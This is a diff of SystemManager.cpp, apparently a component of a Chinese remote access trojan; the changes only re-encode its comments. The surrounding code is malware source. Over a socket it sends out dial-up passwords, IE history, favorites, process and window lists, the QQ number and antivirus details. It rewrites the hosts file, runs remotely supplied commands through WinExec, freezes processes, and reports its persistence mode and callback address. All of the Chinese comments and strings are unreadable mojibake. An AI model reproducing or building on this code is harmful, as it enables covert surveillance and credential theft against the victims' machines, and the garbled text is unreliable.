@@ -1,4 +1,4 @@
-ï»¿// SystemManager.cpp: implementation of the CSystemManager class.
+// SystemManager.cpp: implementation of the CSystemManager class.
 //
 //////////////////////////////////////////////////////////////////////
 #include "stdafx.h"
@@ -22,9 +22,9 @@ extern BOOL EnablePrivilege(LPCTSTR lpPrivilegeName, BOOL bEnable);
 //////////////////////////////////////////////////////////////////////
 enum
 {
-	COMMAND_MEMOEY=1,     //è·å–CPUå†…å­˜å€¼å‘½ä»¤
-	COMMAND_STOPED,       //å‘é€åœæ­¢å‘½ä»¤
-	TOKEN_MEMORY          //æœåŠ¡ç«¯å‘é€è¿‡æ¥å†…å­˜ä½¿ç”¨å€¼
+	COMMAND_MEMOEY=1,     //»ñÈ¡CPUÄÚ´æÖµÃüÁî
+	COMMAND_STOPED,       //·¢ËÍÍ£Ö¹ÃüÁî
+	TOKEN_MEMORY          //·şÎñ¶Ë·¢ËÍ¹ıÀ´ÄÚ´æÊ¹ÓÃÖµ
 };
 
 #define SystemBasicInformation       0
@@ -69,10 +69,10 @@ typedef LONG (WINAPI *PROCNTQSI)(UINT,PVOID,ULONG,PULONG);
 ////////////////////////////////////////////////////////////////////////////////////////////
 CSystemManager::CSystemManager(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl) : CManager(pClient)
 {
-	NetPort = Ports;        //è¿æ¥ç«¯å£
-	NetLine = Linetypes;    //è¿æ¥æ–¹å¼
-	NetOpert = Opertypes;   //è¿è¡Œç±»å‹
-	Linkaddress = Addressl; //è¿æ¥åœ°å€
+	NetPort = Ports;        //Á¬½Ó¶Ë¿Ú
+	NetLine = Linetypes;    //Á¬½Ó·½Ê½
+	NetOpert = Opertypes;   //ÔËĞĞÀàĞÍ
+	Linkaddress = Addressl; //Á¬½ÓµØÖ·
 	hSendMemoryThread = NULL;
 	
 //	hStopEvent = CreateEvent(NULL,FALSE,FALSE,NULL);
@@ -133,11 +133,11 @@ void CSystemManager::jiedong(LPBYTE lpBuffer, UINT nSize)  //jiedongjincheng
 			HANDLE oth=OpenThread(THREAD_ALL_ACCESS,FALSE,th32.th32ThreadID);
 			if(::ResumeThread(oth))
 			{
-				//	m_List.SetItemText(idx,2,_T("å·²è§£å†»ï¼"));
+				//	m_List.SetItemText(idx,2,_T("ÒÑ½â¶³£¡"));
 			}
 			else
 			{
-				//	m_List.SetItemText(idx,2,_T("è§£å†»å¤±è´¥ï¼"));
+				//	m_List.SetItemText(idx,2,_T("½â¶³Ê§°Ü£¡"));
 			}
 			CloseHandle(oth);
 			break;
@@ -170,7 +170,7 @@ void CSystemManager::dongjie(LPBYTE lpBuffer, UINT nSize)  //dongjiejincheng
 				//	printf("Onlock ExeFileName %s\n",pe32.szExeFile);
 			}
 			CloseHandle(oth);
-			//	break;  //å¯¹äºçº¿ç¨‹ä¸èƒ½breakäº†,æ³¨æ„å“¦~
+			//	break;  //¶ÔÓÚÏß³Ì²»ÄÜbreakÁË,×¢ÒâÅ¶~
 		}
 		b=::Thread32Next(hThreadSnap,&th32);
 	}
@@ -182,59 +182,59 @@ void CSystemManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	SwitchInputDesktop();
 	switch (lpBuffer[0])
 	{
-	case COMMAND_SYSTEMINFO:     //å‘é€ç³»ç»Ÿä¿¡æ¯
+	case COMMAND_SYSTEMINFO:     //·¢ËÍÏµÍ³ĞÅÏ¢
 		getSendSystemInfo();
 		break;
-	case COMMAND_PSLIST:         //å‘é€è¿›ç¨‹åˆ—è¡¨
+	case COMMAND_PSLIST:         //·¢ËÍ½ø³ÌÁĞ±í
 		SendProcessList();
 		break;
-	case COMMAND_WSLIST:         //å‘é€çª—å£åˆ—è¡¨
+	case COMMAND_WSLIST:         //·¢ËÍ´°¿ÚÁĞ±í
 		SendWindowsList();
 		break;
-	case COMMAND_DIALUPASS:      //å‘é€æ‹¨å·å¯†ç 
+	case COMMAND_DIALUPASS:      //·¢ËÍ²¦ºÅÃÜÂë
 		SendDialupassList();
 		break;
-	case COMMAND_KILLPROCESS:    //å…³é—­è¿›ç¨‹
+	case COMMAND_KILLPROCESS:    //¹Ø±Õ½ø³Ì
 		KillProcess((LPBYTE)lpBuffer + 1, nSize - 1);
 		break;
-	case COMMAND_WINDOW_CLOSE:   //å‘çª—å£å‘é€å…³é—­æ¶ˆæ¯
+	case COMMAND_WINDOW_CLOSE:   //Ïò´°¿Ú·¢ËÍ¹Ø±ÕÏûÏ¢
 		CloseWindow(lpBuffer+1);
 		break;
-	case COMMAND_WINDOW_TEST:    //éšè—çª—å£|æ˜¾ç¤ºçª—å£|æœ€å°åŒ–|æœ€å¤§åŒ–
+	case COMMAND_WINDOW_TEST:    //Òş²Ø´°¿Ú|ÏÔÊ¾´°¿Ú|×îĞ¡»¯|×î´ó»¯
 		TestWindow(lpBuffer+1);
 		break;
-// 	case COMMAND_MEMOEY:         //è·å–CPUå†…å­˜ä½¿ç”¨æƒ…å†µ
+// 	case COMMAND_MEMOEY:         //»ñÈ¡CPUÄÚ´æÊ¹ÓÃÇé¿ö
 // 		hSendMemoryThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SendCPUAndMemoryThread, (LPVOID)this, 0, NULL);
 // 		break;
 // 	case COMMAND_STOPED:
 // 		SetEvent(hStopEvent);
 // 		break;
-	case COMMAND_SOFTWARELIST:   //å‘é€è½¯ä»¶ä¿¡æ¯åˆ—è¡¨
+	case COMMAND_SOFTWARELIST:   //·¢ËÍÈí¼şĞÅÏ¢ÁĞ±í
 		SendSoftWareList();
 		break;
-	case COMMAND_IHLIST:         //å‘é€IEæµè§ˆè®°å½•
+	case COMMAND_IHLIST:         //·¢ËÍIEä¯ÀÀ¼ÇÂ¼
 		SendIEHistoryList();
 		break;
-	case COMMAND_FULIST:         //å‘é€IEæ”¶è—å¤¹
+	case COMMAND_FULIST:         //·¢ËÍIEÊÕ²Ø¼Ğ
 		SendFavoritesUrlList();
 		break;
-	case COMMAND_NSLIST:         //å‘é€ç½‘ç»œè¿æ¥ä¿¡æ¯åˆ—è¡¨
+	case COMMAND_NSLIST:         //·¢ËÍÍøÂçÁ¬½ÓĞÅÏ¢ÁĞ±í
 		SendNetStateList();
 		break;
-	case COMMAND_GETHOSTS:       //å‘é€Hostsæ–‡ä»¶å†…å®¹
+	case COMMAND_GETHOSTS:       //·¢ËÍHostsÎÄ¼şÄÚÈİ
 		SendHostsFileInfo();
 		break;
-	case COMMAND_SETHOSTS:       //ä¿®æ”¹Hostsæ–‡ä»¶å†…å®¹
+	case COMMAND_SETHOSTS:       //ĞŞ¸ÄHostsÎÄ¼şÄÚÈİ
 		SaveHostsFileInfo(lpBuffer + 1, nSize - 1);
 		break;
-	case COMMAND_APPUNINSTALL:   //å¸è½½æœ¬åœ°è½¯ä»¶
+	case COMMAND_APPUNINSTALL:   //Ğ¶ÔØ±¾µØÈí¼ş
 		//printf("%s",(char*)lpBuffer +1);
 		WinExec((LPCSTR)lpBuffer + 1, SW_SHOW);
 		break;
-	case COMMAND_dongjie:  //å…³é—­è¿›ç¨‹
+	case COMMAND_dongjie:  //¹Ø±Õ½ø³Ì
 		dongjie((LPBYTE)lpBuffer + 1, nSize - 1);
 		break;
-	case COMMAND_jiedong:  //å…³é—­è¿›ç¨‹
+	case COMMAND_jiedong:  //¹Ø±Õ½ø³Ì
 		jiedong((LPBYTE)lpBuffer + 1, nSize - 1);
 		break;
 	default:
@@ -358,7 +358,7 @@ void CSystemManager::SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize)
 	CloseHandle(hFile);
 }
 
-void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)  //å…³é—­ç¨‹åº
+void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)  //¹Ø±Õ³ÌĞò
 {
 	HANDLE hProcess = NULL;
 	
@@ -370,13 +370,13 @@ void CSystemManager::KillProcess(LPBYTE lpBuffer, UINT nSize)  //å…³é—­ç¨‹åº
 		CloseHandle(hProcess);
 	}
 	
-	//ç¨ç¨Sleepä¸‹ï¼Œé˜²æ­¢å‡ºé”™
+	//ÉÔÉÔSleepÏÂ£¬·ÀÖ¹³ö´í
 	Sleep(200);
-	//åˆ·æ–°è¿›ç¨‹åˆ—è¡¨
+	//Ë¢ĞÂ½ø³ÌÁĞ±í
 	SendProcessList();
-	//åˆ·æ–°ç½‘ç»œè¿æ¥åˆ—è¡¨
+	//Ë¢ĞÂÍøÂçÁ¬½ÓÁĞ±í
 	SendNetStateList();
-	//åˆ·æ–°çª—å£åˆ—è¡¨
+	//Ë¢ĞÂ´°¿ÚÁĞ±í
 //	SendWindowsList();	
 }
 
@@ -395,49 +395,49 @@ LPBYTE CSystemManager::getProcessList()
 	DWORD			dwOffset = 0;
 	DWORD			dwLength = 0;
 	
-	// è·å–ç³»ç»Ÿè¿›ç¨‹å¿«ç…§
+	// »ñÈ¡ÏµÍ³½ø³Ì¿ìÕÕ
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hProcessSnap == INVALID_HANDLE_VALUE)
 		return NULL;
 	
 	pe32.dwSize = sizeof(PROCESSENTRY32);
-	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); //æš‚æ—¶åˆ†é…ä¸€ä¸‹ç¼“å†²åŒº
+	lpBuffer = (LPBYTE)LocalAlloc(LPTR, 1024); //ÔİÊ±·ÖÅäÒ»ÏÂ»º³åÇø
 	lpBuffer[0] = TOKEN_PSLIST;
 	dwOffset = 1;
 	
-	// è¾“å‡ºè¿›ç¨‹ç›¸å…³ä¿¡æ¯çš„å†…å®¹
+	// Êä³ö½ø³ÌÏà¹ØĞÅÏ¢µÄÄÚÈİ
 	for (BOOL bPE32=Process32First(hProcessSnap, &pe32); bPE32; bPE32=Process32Next(hProcessSnap, &pe32))
 	{
 		hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
 		
-		// è·å–è¿›ç¨‹ä¼˜å…ˆçº§
+		// »ñÈ¡½ø³ÌÓÅÏÈ¼¶
 		ZeroMemory(szProcPriority, sizeof(szProcPriority));
 		switch (GetPriorityClass(hProcess))
 		{
 		case REALTIME_PRIORITY_CLASS:
-			strcpy(szProcPriority, "å®æ—¶");
+			strcpy(szProcPriority, "ÊµÊ±");
 			break;
 		case HIGH_PRIORITY_CLASS:
-			strcpy(szProcPriority, "é«˜");
+			strcpy(szProcPriority, "¸ß");
 			break;
 		case ABOVE_NORMAL_PRIORITY_CLASS:
-			strcpy(szProcPriority, "é«˜äºæ ‡å‡†");
+			strcpy(szProcPriority, "¸ßÓÚ±ê×¼");
 			break;
 		case NORMAL_PRIORITY_CLASS:
-			strcpy(szProcPriority, "æ ‡å‡†");
+			strcpy(szProcPriority, "±ê×¼");
 			break;
 		case BELOW_NORMAL_PRIORITY_CLASS:
-			strcpy(szProcPriority, "ä½äºæ ‡å‡†");
+			strcpy(szProcPriority, "µÍÓÚ±ê×¼");
 			break;
 		case IDLE_PRIORITY_CLASS:
-			strcpy(szProcPriority, "ä½");
+			strcpy(szProcPriority, "µÍ");
 			break;
 		}
 		
-		// è·å–è¿›ç¨‹çº¿ç¨‹æ•°
+		// »ñÈ¡½ø³ÌÏß³ÌÊı
 		sprintf(szThreadsCount, "%5u", pe32.cntThreads);
 		
-		// è·å–è¿›ç¨‹ç”¨æˆ·å
+		// »ñÈ¡½ø³ÌÓÃ»§Ãû
 		HANDLE hProcToken = NULL; SID_NAME_USE snu;
 		if (OpenProcessToken(hProcess, TOKEN_QUERY, &hProcToken))
 		{
@@ -453,7 +453,7 @@ LPBYTE CSystemManager::getProcessList()
 		}
 		else ZeroMemory(szProcUserName, sizeof(szProcUserName));
 		
-		// è·å–è¿›ç¨‹å ç”¨å†…å­˜
+		// »ñÈ¡½ø³ÌÕ¼ÓÃÄÚ´æ
 		PROCESS_MEMORY_COUNTERS pmc = {0};
 		if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc)))
 		{
@@ -461,7 +461,7 @@ LPBYTE CSystemManager::getProcessList()
 		}
 		else ZeroMemory(szProcMemUsed, sizeof(szProcMemUsed));
 		
-		// å¾—åˆ°è‡ªèº«çš„å®Œæ•´åç§°
+		// µÃµ½×ÔÉíµÄÍêÕûÃû³Æ
 		if (GetModuleFileNameEx(hProcess, NULL, szProcFileName, sizeof(szProcFileName)))
 		{
 			char szWinDir[MAX_PATH] = {0}, szBuffer[MAX_PATH] = {0};
@@ -496,26 +496,26 @@ LPBYTE CSystemManager::getProcessList()
 		if (LocalSize(lpBuffer) < (dwOffset + dwLength))
 			lpBuffer = (LPBYTE)LocalReAlloc(lpBuffer, (dwOffset + dwLength), LMEM_ZEROINIT|LMEM_MOVEABLE);
 		
-		// æ•°æ®ç»“æ„: è¿›ç¨‹ID+è¿›ç¨‹å+ä¼˜å…ˆçº§+çº¿ç¨‹æ•°+å ç”¨å†…å­˜+è¿›ç¨‹å®Œæ•´å
-		memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));        // è¿›ç¨‹ID
+		// Êı¾İ½á¹¹: ½ø³ÌID+½ø³ÌÃû+ÓÅÏÈ¼¶+Ïß³ÌÊı+Õ¼ÓÃÄÚ´æ+½ø³ÌÍêÕûÃû
+		memcpy(lpBuffer + dwOffset, &(pe32.th32ProcessID), sizeof(DWORD));        // ½ø³ÌID
 		dwOffset += sizeof(DWORD);
 		
-		memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1); // è¿›ç¨‹å
+		memcpy(lpBuffer + dwOffset, pe32.szExeFile, lstrlen(pe32.szExeFile) + 1); // ½ø³ÌÃû
 		dwOffset += lstrlen(pe32.szExeFile) + 1;
 		
-		memcpy(lpBuffer + dwOffset, szProcPriority, lstrlen(szProcPriority) + 1); // ä¼˜å…ˆçº§
+		memcpy(lpBuffer + dwOffset, szProcPriority, lstrlen(szProcPriority) + 1); // ÓÅÏÈ¼¶
 		dwOffset += lstrlen(szProcPriority) + 1;
 		
-		memcpy(lpBuffer + dwOffset, szThreadsCount, lstrlen(szThreadsCount) + 1); // çº¿ç¨‹æ•°
+		memcpy(lpBuffer + dwOffset, szThreadsCount, lstrlen(szThreadsCount) + 1); // Ïß³ÌÊı
 		dwOffset += lstrlen(szThreadsCount) + 1;
 		
-		memcpy(lpBuffer + dwOffset, szProcUserName, lstrlen(szProcUserName) + 1); // ç”¨æˆ·å
+		memcpy(lpBuffer + dwOffset, szProcUserName, lstrlen(szProcUserName) + 1); // ÓÃ»§Ãû
 		dwOffset += lstrlen(szProcUserName) + 1;
 		
-		memcpy(lpBuffer + dwOffset, szProcMemUsed, lstrlen(szProcMemUsed) + 1);   // å ç”¨å†…å­˜
+		memcpy(lpBuffer + dwOffset, szProcMemUsed, lstrlen(szProcMemUsed) + 1);   // Õ¼ÓÃÄÚ´æ
 		dwOffset += lstrlen(szProcMemUsed) + 1;
 		
-		memcpy(lpBuffer + dwOffset, szProcFileName, lstrlen(szProcFileName) + 1); // è¿›ç¨‹å®Œæ•´å
+		memcpy(lpBuffer + dwOffset, szProcFileName, lstrlen(szProcFileName) + 1); // ½ø³ÌÍêÕûÃû
 		dwOffset += lstrlen(szProcFileName) + 1;
 		
 		CloseHandle(hProcess);
@@ -576,7 +576,7 @@ LPBYTE CSystemManager::getWindowsList()
 	return lpBuffer;
 }
 
-//è·å–å†…å­˜ä½¿ç”¨æƒ…å†µ
+//»ñÈ¡ÄÚ´æÊ¹ÓÃÇé¿ö
 void SendCPUAndMemoryInfo(DWORD d,LPVOID lparam)
 {
 	CSystemManager *pThis = (CSystemManager *)lparam;
@@ -586,7 +586,7 @@ void SendCPUAndMemoryInfo(DWORD d,LPVOID lparam)
 	buf[0]=TOKEN_MEMORY;
 	MEMORYSTATUS mem;
 	::GlobalMemoryStatus(&mem);
-	memcpy(buf+1,(void*)&mem.dwAvailPhys,sizeof(DWORD));   //å†…å­˜
+	memcpy(buf+1,(void*)&mem.dwAvailPhys,sizeof(DWORD));   //ÄÚ´æ
 	
 	memcpy(buf+1+sizeof(DWORD),(void*)&d,sizeof(DWORD));
 	
@@ -702,18 +702,18 @@ BOOL GetCurrentUserName(char *szUserName)
 		WTSFreeMemory(lpUserName);
 		if (!strlen(szUserName))
 		{
-			strcpy(szUserName, "æ— ç”¨æˆ·ç™»é™†çŠ¶æ€!");
+			strcpy(szUserName, "ÎŞÓÃ»§µÇÂ½×´Ì¬!");
 			return FALSE;
 		}
 		return TRUE;
 	}
-	strcpy(szUserName, "æ— ç”¨æˆ·ç™»é™†çŠ¶æ€!");
+	strcpy(szUserName, "ÎŞÓÃ»§µÇÂ½×´Ì¬!");
 	return FALSE;
 }
 
 void CSystemManager::NetSystem(UINT Port)
 {
-	NetPort = Port;     //è¿æ¥ç«¯å£
+	NetPort = Port;     //Á¬½Ó¶Ë¿Ú
 }
 
 char* CSystemManager::DelSpace(char *szData)
@@ -740,7 +740,7 @@ void CSystemManager::getSendSystemInfo()
 {
 	MESSAGEInfo Infomsg;
 	ZeroMemory(&Infomsg, sizeof(Infomsg));
-	//è·å–æ“ä½œç³»ç»Ÿç›¸å…³ä¿¡æ¯
+	//»ñÈ¡²Ù×÷ÏµÍ³Ïà¹ØĞÅÏ¢
 	Infomsg.bToken = TOKEN_SYSTEMINFO;
 	
 	//////////////CPU Speed////////////////////////////////
@@ -752,12 +752,12 @@ void CSystemManager::getSendSystemInfo()
 		dwBufLen = sizeof(DWORD);
 		RegQueryValueEx(hKey, ("~MHz"), NULL, NULL,(LPBYTE)&dwCpu, &dwBufLen);
 		RegCloseKey(hKey);
-		SYSTEM_INFO SysInfo; //ç”¨äºè·å–CPUä¸ªæ•°çš„
+		SYSTEM_INFO SysInfo; //ÓÃÓÚ»ñÈ¡CPU¸öÊıµÄ
 		GetSystemInfo(&SysInfo);
 		wsprintf(Infomsg.szCpuSpeend, "%d*%dMHz", SysInfo.dwNumberOfProcessors, dwCpu);
 	}
 	else
-		strcpy(Infomsg.szCpuInfo,"CPUé€Ÿåº¦æ— æ³•è·å–!");
+		strcpy(Infomsg.szCpuInfo,"CPUËÙ¶ÈÎŞ·¨»ñÈ¡!");
 	
 	//Get CPU Info=========================================
 	char SubKey2[] = {'H','A','R','D','W','A','R','E','\\','D','E','S','C','R','I','P','T','I','O','N','\\','S','y','s','t','e','m','\\','C','e','n','t','r','a','l','P','r','o','c','e','s','s','o','r','\\','0','\0','\0'};
@@ -771,14 +771,14 @@ void CSystemManager::getSendSystemInfo()
 		RegCloseKey(hKey);
 	}
 	else
-		strcpy(Infomsg.szCpuInfo,"CPUä¿¡æ¯æ— æ³•è·å–!");
+		strcpy(Infomsg.szCpuInfo,"CPUĞÅÏ¢ÎŞ·¨»ñÈ¡!");
 	
-	//è·å–è®¡ç®—æœºåç§°å’Œå½“å‰ç™»å½•ç”¨æˆ·å
+	//»ñÈ¡¼ÆËã»úÃû³ÆºÍµ±Ç°µÇÂ¼ÓÃ»§Ãû
 	DWORD dwLen = sizeof(Infomsg.szPcName);
 	GetComputerName(Infomsg.szPcName, &dwLen);
 	GetCurrentUserName(Infomsg.szUserName);
 	
-	//è·å–æ´»åŠ¨æ—¶é—´
+	//»ñÈ¡»î¶¯Ê±¼ä
 	DWORD dwTime,dwDay,dwHour,dwMin;
 	dwTime = GetTickCount();
 	dwDay = dwTime / (1000 * 60 * 60 * 24);
@@ -786,7 +786,7 @@ void CSystemManager::getSendSystemInfo()
 	dwHour = dwTime / (1000 * 60 * 60);
 	dwTime = dwTime % (1000 * 60 * 60);
 	dwMin = dwTime / (1000 * 60);
-	wsprintf(Infomsg.szActiveTime, "%då¤©%dæ—¶%dåˆ†", dwDay, dwHour, dwMin);
+	wsprintf(Infomsg.szActiveTime, "%dÌì%dÊ±%d·Ö", dwDay, dwHour, dwMin);
 	
 	//Get Screen Size=================================
 	HDC hDeskTopDC = GetDC(NULL);
@@ -794,28 +794,28 @@ void CSystemManager::getSendSystemInfo()
 	ReleaseDC(NULL, hDeskTopDC);
 	
 	if(NetLine==0)
-	    wsprintf(Infomsg.LineName,"åŸŸåIP(1)ä¸Šçº¿ï¼š%s",Linkaddress);  //åŸŸåä¸Šçº¿å†™å…¥
+	    wsprintf(Infomsg.LineName,"ÓòÃûIP(1)ÉÏÏß£º%s",Linkaddress);  //ÓòÃûÉÏÏßĞ´Èë
 	if(NetLine==1)
-	    wsprintf(Infomsg.LineName,"QQä¸Šçº¿(2)ä¸Šçº¿ï¼š%s",Linkaddress);  //åŸŸåä¸Šçº¿å†™å…¥
+	    wsprintf(Infomsg.LineName,"QQÉÏÏß(2)ÉÏÏß£º%s",Linkaddress);  //ÓòÃûÉÏÏßĞ´Èë
 	
-	wsprintf(Infomsg.LinePort,"%d",NetPort);         //ä¸Šçº¿ç«¯å£å†™å…¥
-	wsprintf(Infomsg.Program,"%s",GetCommandLine()); //è·å–(å‘½ä»¤è¡Œ)
+	wsprintf(Infomsg.LinePort,"%d",NetPort);         //ÉÏÏß¶Ë¿ÚĞ´Èë
+	wsprintf(Infomsg.Program,"%s",GetCommandLine()); //»ñÈ¡(ÃüÁîĞĞ)
 	
 	char szUserName[UNLEN+1];
 	DWORD dwUserLen = UNLEN;
 	GetUserName(szUserName,&dwUserLen);
-	if(NetOpert==0)       // ç»¿è‰²è¿è¡Œä¸€æ¬¡
-	    wsprintf(Infomsg.InstallOpen,"%s%s%s","(ç»¿è‰²è¿è¡Œæ¨¡å¼)--",szUserName,"é‡å¯ä¸ä¸Šçº¿!");   //ä¸Šçº¿è¿è¡Œæ–¹å¼
-	else if(NetOpert==1)  // æœåŠ¡å¯åŠ¨è¿è¡Œ
-		wsprintf(Infomsg.InstallOpen,"%s%s%s","(æœåŠ¡å¯åŠ¨æ¨¡å¼)--",szUserName,"ç”¨æˆ·è¿è¡Œ!");     //ä¸Šçº¿è¿è¡Œæ–¹å¼
-	else if(NetOpert==2)  // ç›´æ¥å¯åŠ¨è¿è¡Œ
-		wsprintf(Infomsg.InstallOpen,"%s%s%s","(Runå¯åŠ¨æ¨¡å¼)--",szUserName,"ç”¨æˆ·è¿è¡Œ!");      //ä¸Šçº¿è¿è¡Œæ–¹å¼
- 	else if(NetOpert==3)  // Run å¯åŠ¨è¿è¡Œ
- 		wsprintf(Infomsg.InstallOpen,"%s%s%s","(æ³¨å†Œè¡¨å¯åŠ¨æ¨¡å¼)--",szUserName,"ç”¨æˆ·è¿è¡Œ!");   //ä¸Šçº¿è¿è¡Œæ–¹å¼
+	if(NetOpert==0)       // ÂÌÉ«ÔËĞĞÒ»´Î
+	    wsprintf(Infomsg.InstallOpen,"%s%s%s","(ÂÌÉ«ÔËĞĞÄ£Ê½)--",szUserName,"ÖØÆô²»ÉÏÏß!");   //ÉÏÏßÔËĞĞ·½Ê½
+	else if(NetOpert==1)  // ·şÎñÆô¶¯ÔËĞĞ
+		wsprintf(Infomsg.InstallOpen,"%s%s%s","(·şÎñÆô¶¯Ä£Ê½)--",szUserName,"ÓÃ»§ÔËĞĞ!");     //ÉÏÏßÔËĞĞ·½Ê½
+	else if(NetOpert==2)  // Ö±½ÓÆô¶¯ÔËĞĞ
+		wsprintf(Infomsg.InstallOpen,"%s%s%s","(RunÆô¶¯Ä£Ê½)--",szUserName,"ÓÃ»§ÔËĞĞ!");      //ÉÏÏßÔËĞĞ·½Ê½
+ 	else if(NetOpert==3)  // Run Æô¶¯ÔËĞĞ
+ 		wsprintf(Infomsg.InstallOpen,"%s%s%s","(×¢²á±íÆô¶¯Ä£Ê½)--",szUserName,"ÓÃ»§ÔËĞĞ!");   //ÉÏÏßÔËĞĞ·½Ê½
 	
-	wsprintf(Infomsg.szUserVirus,"%s",GetVirus());   //æ€æ¯’è½¯ä»¶
+	wsprintf(Infomsg.szUserVirus,"%s",GetVirus());   //É±¶¾Èí¼ş
 	
-	//è·å–å½“å‰è¿è¡Œçš„QQå·ç 
+	//»ñÈ¡µ±Ç°ÔËĞĞµÄQQºÅÂë
 	char szText[MAX_PATH] = "CTXOPConntion_Class";
     char szQQNumber[MAX_PATH] = {0};
     HWND hWnd = FindWindow(szText, NULL);
@@ -840,8 +840,8 @@ void CSystemManager::getSendSystemInfo()
 		GetClassName(hWnd, szText, MAX_PATH);
     }
 	
-	//å†…å­˜å¤§å°
-    MEMORYSTATUSEX	MemInfo; //ç”¨GlobalMemoryStatusExå¯æ˜¾ç¤º2Gä»¥ä¸Šå†…å­˜
+	//ÄÚ´æ´óĞ¡
+    MEMORYSTATUSEX	MemInfo; //ÓÃGlobalMemoryStatusEx¿ÉÏÔÊ¾2GÒÔÉÏÄÚ´æ
     MemInfo.dwLength=sizeof(MemInfo); 
     GlobalMemoryStatusEx(&MemInfo);
 	Infomsg.Memory = MemInfo.ullTotalPhys/1024/1024;
@@ -852,19 +852,19 @@ void CSystemManager::getSendSystemInfo()
 void CSystemManager::CloseWindow(LPBYTE buf)
 {
 	DWORD hwnd;
-	memcpy(&hwnd,buf,sizeof(DWORD));            //å¾—åˆ°çª—å£å¥æŸ„ 
-	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //å‘çª—å£å‘é€å…³é—­æ¶ˆæ¯
+	memcpy(&hwnd,buf,sizeof(DWORD));            //µÃµ½´°¿Ú¾ä±ú 
+	::PostMessage((HWND__ *)hwnd,WM_CLOSE,0,0); //Ïò´°¿Ú·¢ËÍ¹Ø±ÕÏûÏ¢
 	
 	Sleep(200);
-	SendWindowsList();  //çª—å£æ˜¾ç¤ºåˆ·æ–°
+	SendWindowsList();  //´°¿ÚÏÔÊ¾Ë¢ĞÂ
 }
 
 void CSystemManager::TestWindow(LPBYTE buf)
 {
    	DWORD hwnd;
 	DWORD dHow;
-	memcpy((void*)&hwnd,buf,sizeof(DWORD));        //å¾—åˆ°çª—å£å¥æŸ„
-	memcpy(&dHow,buf+sizeof(DWORD),sizeof(DWORD)); //å¾—åˆ°çª—å£å¤„ç†å‚æ•°
+	memcpy((void*)&hwnd,buf,sizeof(DWORD));        //µÃµ½´°¿Ú¾ä±ú
+	memcpy(&dHow,buf+sizeof(DWORD),sizeof(DWORD)); //µÃµ½´°¿Ú´¦Àí²ÎÊı
 	ShowWindow((HWND__ *)hwnd,dHow);
 }
 
@@ -899,7 +899,7 @@ void CSystemManager::SendSoftWareList()
 }
 
 LPBYTE	lpFUBuffer = NULL;
-DWORD	dwFUOffset = 1; // ä½ç§»æŒ‡é’ˆ
+DWORD	dwFUOffset = 1; // Î»ÒÆÖ¸Õë
 void FindFavoritesUrl(char* searchfilename)
 {
 	char favpath[MAX_PATH] = {0};
@@ -912,7 +912,7 @@ void FindFavoritesUrl(char* searchfilename)
 	WIN32_FIND_DATA fd;
 	ZeroMemory(&fd, sizeof(WIN32_FIND_DATA));
 	
-	HANDLE hFind = FindFirstFile(favpath, &fd); // æ–‡ä»¶åç¼€éƒ½æ˜¯ url
+	HANDLE hFind = FindFirstFile(favpath, &fd); // ÎÄ¼şºó×º¶¼ÊÇ url
 	do
 	{
 		if (fd.cFileName[0] != '.')
@@ -926,7 +926,7 @@ void FindFavoritesUrl(char* searchfilename)
 			}
 			else if (strstr(fd.cFileName, ".url"))
 			{
-//				printf("æ–‡ä»¶å ï¼š %s åŒ¹é… \r\n",fd.cFileName);
+//				printf("ÎÄ¼şÃû £º %s Æ¥Åä \r\n",fd.cFileName);
 				
 				TCHAR buf[MAX_PATH] = {0};
 				::GetPrivateProfileString("InternetShortcut", "URL", "", buf, sizeof(buf), tmpPath);
@@ -964,7 +964,7 @@ inline char* UnicodeToAnsi( const wchar_t* szStr )
     int nLen = WideCharToMultiByte( CP_ACP, 0, szStr, -1, NULL, 0, NULL, NULL );  
     if (nLen == 0)  
     {  
-        return "æœªçŸ¥";  
+        return "Î´Öª";  
     }  
     char* pResult = new char[nLen];  
     WideCharToMultiByte( CP_ACP, 0, szStr, -1, pResult, nLen, NULL, NULL );  
@@ -975,7 +975,7 @@ LPBYTE CSystemManager::getFavoritesUrlList()
 {
 	char favpath[MAX_PATH] = {0};
 	
-	// ä»æ³¨å†Œè¡¨è·å–æ”¶è—å¤¹æ‰€åœ¨ä½ç½®
+	// ´Ó×¢²á±í»ñÈ¡ÊÕ²Ø¼ĞËùÔÚÎ»ÖÃ
     HKEY hKEY;
 	DWORD type=REG_SZ;
 	LPCTSTR path="Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders";
@@ -1044,9 +1044,9 @@ LPBYTE CSystemManager::getIEHistoryList()
 				memcpy(lpBuffer + dwOffset, strUrl, lstrlen(strUrl) + 1);
 				dwOffset += lstrlen(strUrl) + 1;
 				
-				if (strcmp(strTitle, "æœªçŸ¥"))
+				if (strcmp(strTitle, "Î´Öª"))
 					delete[] strTitle;
-				if (strcmp(strUrl, "æœªçŸ¥"))
+				if (strcmp(strUrl, "Î´Öª"))
 					delete[] strUrl;
             }
             
@@ -1103,9 +1103,9 @@ LPBYTE CSystemManager::getSoftWareList()
 
 					dwRegSize = MAX_LEG;
 					memset(regBufferValue,0,MAX_LEG);
-					// å–ParentKeyNameé”®å€¼,åˆ¤æ–­æ˜¯å¦æ˜¯è¡¥ä¸ä¿¡æ¯, æ˜¯è¡¥ä¸ä¿¡æ¯é”®å€¼ä¸º"OperatingSystem"
+					// È¡ParentKeyName¼üÖµ,ÅĞ¶ÏÊÇ·ñÊÇ²¹¶¡ĞÅÏ¢, ÊÇ²¹¶¡ĞÅÏ¢¼üÖµÎª"OperatingSystem"
 					RegQueryValueEx(hSubKey, "ParentKeyName", 0, &dwType, (LPBYTE)regBufferValue, &dwRegSize);
